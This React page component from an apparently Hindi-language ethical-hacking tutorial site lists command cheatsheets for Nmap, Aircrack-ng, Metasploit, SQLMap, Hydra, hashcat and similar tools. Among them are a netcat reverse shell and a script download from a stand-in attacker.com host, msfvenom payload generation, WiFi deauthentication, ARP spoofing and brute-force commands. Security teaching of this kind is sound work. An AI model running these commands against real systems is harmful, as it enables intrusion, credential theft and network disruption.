import { useState } from 'react'
import MetaTags from '../components/MetaTags'
import { Link } from 'react-router-dom'
import AdUnit from '../components/AdUnit'

const cheatsheets = [
  {
    category: 'Nmap',
    icon: '🔍',
    color: 'text-purple-400',
    border: 'border-purple-500/30',
    bg: 'bg-purple-500/10',
    commands: [
      { cmd: 'nmap -sV -sC target.com', desc: 'Service version + default scripts scan' },
      { cmd: 'nmap -sS -O target.com', desc: 'SYN scan + OS detection' },
      { cmd: 'nmap -p- target.com', desc: 'All 65535 ports scan' },
      { cmd: 'nmap -sn 192.168.1.0/24', desc: 'Ping sweep - live hosts dhundhein' },
      { cmd: 'nmap --script vuln target.com', desc: 'Vulnerability scan' },
      { cmd: 'nmap -T4 -A target.com', desc: 'Aggressive scan (fast + detailed)' },
      { cmd: 'nmap -sU target.com', desc: 'UDP ports scan' },
    ],
  },
  {
    category: 'Aircrack-ng',
    icon: '📶',
    color: 'text-yellow-400',
    border: 'border-yellow-500/30',
    bg: 'bg-yellow-500/10',
    commands: [
      { cmd: 'airmon-ng start wlan0', desc: 'Monitor mode start' },
      { cmd: 'airodump-ng wlan0mon', desc: 'WiFi networks list' },
      { cmd: 'airodump-ng -c 6 --bssid XX:XX -w capture wlan0mon', desc: 'Target handshake capture' },
      { cmd: 'aireplay-ng -0 5 -a XX:XX wlan0mon', desc: 'Deauth attack - handshake force capture' },
      { cmd: 'aircrack-ng -w wordlist.txt capture-01.cap', desc: 'Handshake crack karein' },
      { cmd: 'airgeddon', desc: 'All-in-one WiFi audit script' },
    ],
  },
  {
    category: 'Metasploit',
    icon: '💀',
    color: 'text-pink-400',
    border: 'border-pink-500/30',
    bg: 'bg-pink-500/10',
    commands: [
      { cmd: 'msfconsole', desc: 'Metasploit console start' },
      { cmd: 'search type:exploit platform:windows', desc: 'Exploit search' },
      { cmd: 'use exploit/multi/handler', desc: 'Handler set karein' },
      { cmd: 'set PAYLOAD windows/meterpreter/reverse_tcp', desc: 'Payload set karein' },
      { cmd: 'set LHOST 192.168.1.10', desc: 'Local host set karein' },
      { cmd: 'run', desc: 'Exploit run karein' },
      { cmd: 'sessions -i 1', desc: 'Active session interact' },
      { cmd: 'msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=IP LPORT=4444 -f elf -o shell.elf', desc: 'Payload generate' },
    ],
  },
  {
    category: 'SQLMap',
    icon: '🗃️',
    color: 'text-orange-400',
    border: 'border-orange-500/30',
    bg: 'bg-orange-500/10',
    commands: [
      { cmd: 'sqlmap -u "http://target.com?id=1"', desc: 'Basic SQL injection test' },
      { cmd: 'sqlmap -u "http://target.com?id=1" --dbs', desc: 'Databases list karein' },
      { cmd: 'sqlmap -u "http://target.com?id=1" -D dbname --tables', desc: 'Tables list karein' },
      { cmd: 'sqlmap -u "http://target.com?id=1" -D dbname -T users --columns', desc: 'Columns list karein' },
      { cmd: 'sqlmap -u "http://target.com?id=1" -D dbname -T users --dump', desc: 'Data extract karein' },
      { cmd: 'sqlmap -u "http://target.com?id=1" --os-shell', desc: 'OS shell get karein' },
      { cmd: 'sqlmap -u "http://target.com?id=1" --level 5 --risk 3', desc: 'Aggressive test' },
    ],
  },
  {
    category: 'Password Cracking',
    icon: '🔓',
    color: 'text-red-400',
    border: 'border-red-500/30',
    bg: 'bg-red-500/10',
    commands: [
      { cmd: 'hydra -l admin -P wordlist.txt ssh://target.com', desc: 'SSH brute force' },
      { cmd: 'hydra -L users.txt -P pass.txt ftp://target.com', desc: 'FTP brute force' },
      { cmd: 'john --wordlist=rockyou.txt hash.txt', desc: 'John hash crack' },
      { cmd: 'hashcat -m 0 -a 0 hash.txt rockyou.txt', desc: 'Hashcat MD5 crack' },
      { cmd: 'hashcat -m 1000 -a 0 hash.txt rockyou.txt --show', desc: 'NTLM hash show' },
      { cmd: 'crunch 8 10 abc123 -o wordlist.txt', desc: 'Custom wordlist generate' },
    ],
  },
  {
    category: 'Web Testing',
    icon: '🌐',
    color: 'text-blue-400',
    border: 'border-blue-500/30',
    bg: 'bg-blue-500/10',
    commands: [
      { cmd: 'gobuster dir -u http://target.com -w wordlist.txt', desc: 'Directory brute force' },
      { cmd: 'gobuster dns -d target.com -w subdomains.txt', desc: 'Subdomain brute force' },
      { cmd: 'nikto -h http://target.com', desc: 'Web server vulnerabilities check' },
      { cmd: 'wpscan --url http://target.com', desc: 'WordPress scan' },
      { cmd: 'dirb http://target.com wordlist.txt', desc: 'Directory scanner' },
      { cmd: 'ffuf -u http://target.com/FUZZ -w wordlist.txt', desc: 'Fast web fuzzer' },
    ],
  },
  {
    category: 'Network',
    icon: '🔌',
    color: 'text-cyan-400',
    border: 'border-cyan-500/30',
    bg: 'bg-cyan-500/10',
    commands: [
      { cmd: 'netdiscover -r 192.168.1.0/24', desc: 'ARP scan - live hosts' },
      { cmd: 'bettercap -eval "set arp.spoof.targets 192.168.1.100; arp.spoof on"', desc: 'ARP spoofing' },
      { cmd: 'tcpdump -i wlan0 -w capture.pcap', desc: 'Packet capture' },
      { cmd: 'wireshark capture.pcap', desc: 'GUI packet analysis' },
      { cmd: 'arp-scan --localnet', desc: 'ARP scanner' },
      { cmd: 'masscan 192.168.1.0/24 -p80,443 --rate=1000', desc: 'Fast port scanner' },
    ],
  },
  {
    category: 'Exploitation',
    icon: '⚡',
    color: 'text-green-400',
    border: 'border-green-500/30',
    bg: 'bg-green-500/10',
    commands: [
      { cmd: 'searchsploit apache 2.4.49', desc: 'Exploit search in database' },
      { cmd: 'searchsploit -m 50000', desc: 'Exploit copy to current dir' },
      { cmd: 'nc -lvnp 4444', desc: 'Netcat listener for reverse shell' },
      { cmd: 'nc -e /bin/sh attacker.com 4444', desc: 'Netcat reverse shell (Linux)' },
      { cmd: 'python3 -c \'import pty;pty.spawn("/bin/bash")\'', desc: 'Shell upgrade to full TTY' },
      { cmd: 'proxychains4 nmap -sT target.com', desc: 'Scan through proxy' },
    ],
  },
  {
    category: 'Post-Exploitation',
    icon: '🎯',
    color: 'text-rose-400',
    border: 'border-rose-500/30',
    bg: 'bg-rose-500/10',
    commands: [
      { cmd: 'wget http://attacker.com/linpeas.sh && chmod +x linpeas.sh && ./linpeas.sh', desc: 'Linux privilege escalation enum' },
      { cmd: 'python3 -c \'import pty;pty.spawn("/bin/bash")\'', desc: 'TTY shell upgrade' },
      { cmd: 'find / -perm -4000 2>/dev/null', desc: 'SUID binaries find' },
      { cmd: 'sudo -l', desc: 'Sudo permissions check' },
      { cmd: 'crontab -l', desc: 'Cron jobs check' },
      { cmd: 'uname -a', desc: 'Kernel version check' },
    ],
  },
  {
    category: 'Mobile (Android)',
    icon: '📱',
    color: 'text-emerald-400',
    border: 'border-emerald-500/30',
    bg: 'bg-emerald-500/10',
    commands: [
      { cmd: 'apktool d app.apk', desc: 'APK decompile' },
      { cmd: 'apktool b app/ -o patched.apk', desc: 'APK rebuild' },
      { cmd: 'jarsigner -keystore my.keystore app.apk alias_name', desc: 'APK sign karein' },
      { cmd: 'adb devices', desc: 'Connected devices list' },
      { cmd: 'adb shell', desc: 'Device shell access' },
      { cmd: 'adb install app.apk', desc: 'APK install karein' },
      { cmd: 'frida-ps -U', desc: 'Running processes list' },
    ],
  },
]

const categoryColors = {
  'Nmap': { bg: 'bg-purple-500/10', border: 'border-purple-500/30', text: 'text-purple-400', accent: 'text-purple-300' },
  'Aircrack-ng': { bg: 'bg-yellow-500/10', border: 'border-yellow-500/30', text: 'text-yellow-400', accent: 'text-yellow-300' },
  'Metasploit': { bg: 'bg-pink-500/10', border: 'border-pink-500/30', text: 'text-pink-400', accent: 'text-pink-300' },
  'SQLMap': { bg: 'bg-orange-500/10', border: 'border-orange-500/30', text: 'text-orange-400', accent: 'text-orange-300' },
  'Password Cracking': { bg: 'bg-red-500/10', border: 'border-red-500/30', text: 'text-red-400', accent: 'text-red-300' },
  'Web Testing': { bg: 'bg-blue-500/10', border: 'border-blue-500/30', text: 'text-blue-400', accent: 'text-blue-300' },
  'Network': { bg: 'bg-cyan-500/10', border: 'border-cyan-500/30', text: 'text-cyan-400', accent: 'text-cyan-300' },
  'Exploitation': { bg: 'bg-green-500/10', border: 'border-green-500/30', text: 'text-green-400', accent: 'text-green-300' },
  'Post-Exploitation': { bg: 'bg-rose-500/10', border: 'border-rose-500/30', text: 'text-rose-400', accent: 'text-rose-300' },
  'Mobile (Android)': { bg: 'bg-emerald-500/10', border: 'border-emerald-500/30', text: 'text-emerald-400', accent: 'text-emerald-300' },
}

export default function Cheatsheets() {
  const [activeCategory, setActiveCategory] = useState(null)

  const filtered = activeCategory ? cheatsheets.filter(c => c.category === activeCategory) : cheatsheets

  return (
    <div className="max-w-6xl mx-auto px-4 py-12">
      <MetaTags
        title="Cheatsheets"
        description="Ethical hacking command cheatsheets Hindi mein. Nmap, Metasploit, SQLMap, Aircrack-ng aur aur bhi tools."
        keywords="hacking cheatsheets, command reference, nmap cheatsheet, metasploit commands"
        url="https://nethunter-learn.vercel.app/cheatsheets"
      />
      <div className="text-center mb-10">
        <h1 className="section-title">Command Cheatsheets</h1>
        <p className="text-gray-400 text-lg max-w-2xl mx-auto">
          Har tool ke important commands ek jagah. Print karein aur refer karte rahein.
        </p>
      </div>

      <div className="flex flex-wrap justify-center gap-2 mb-10">
        <button onClick={() => setActiveCategory(null)} className={`px-4 py-2 rounded-lg text-sm font-medium transition-all ${!activeCategory ? 'bg-neon-green/20 text-neon-green border border-neon-green/40' : 'bg-dark-800 text-gray-400 border border-dark-600 hover:border-neon-green/30'}`}>सभी</button>
        {cheatsheets.map(c => (
          <button key={c.category} onClick={() => setActiveCategory(c.category)} className={`px-4 py-2 rounded-lg text-sm font-medium transition-all ${activeCategory === c.category ? `${c.bg} ${c.color} border ${c.border}` : 'bg-dark-800 text-gray-400 border border-dark-600 hover:border-neon-green/30'}`}>{c.icon} {c.category}</button>
        ))}
      </div>

      <div className="space-y-8">
        {filtered.map(category => {
          const colors = categoryColors[category.category] || { bg: 'bg-dark-800', border: 'border-dark-600', text: 'text-gray-300', accent: 'text-gray-300' }
          return (
            <div key={category.category} className={`glass-card p-6 border ${colors.border}`}>
              <h2 className={`text-xl font-heading font-bold ${colors.text} mb-1`}>{category.icon} {category.category}</h2>
              <p className="text-gray-500 text-xs mb-4">Command cheatsheet for quick reference</p>
              <div className="space-y-2">
                {category.commands.map((cmd, i) => (
                  <div key={i} className={`flex flex-col sm:flex-row sm:items-center gap-2 p-3 rounded-lg ${colors.bg} border ${colors.border}`}>
                    <code className="text-sm font-mono text-white flex-1">{cmd.cmd}</code>
                    <span className="text-xs text-gray-500 sm:text-right shrink-0">{cmd.desc}</span>
                  </div>
                ))}
              </div>
            </div>
          )
        })}
      </div>

      <div className="mt-12 glass-card p-6 text-center">
        <p className="text-gray-400 mb-4">Practice ke liye tools ke full tutorials padhein:</p>
        <div className="flex flex-wrap justify-center gap-3">
          <Link to="/tools" className="btn-outline px-4 py-2 rounded-lg text-neon-green border-neon-green/30 text-sm">Sab Tools Dekhein</Link>
          <Link to="/learning-paths" className="btn-primary px-4 py-2 rounded-lg text-dark-900 text-sm">Learning Path Shuru Karein</Link>
        </div>
      </div>
      <AdUnit slot="7546303747" />
    </div>
  )
}
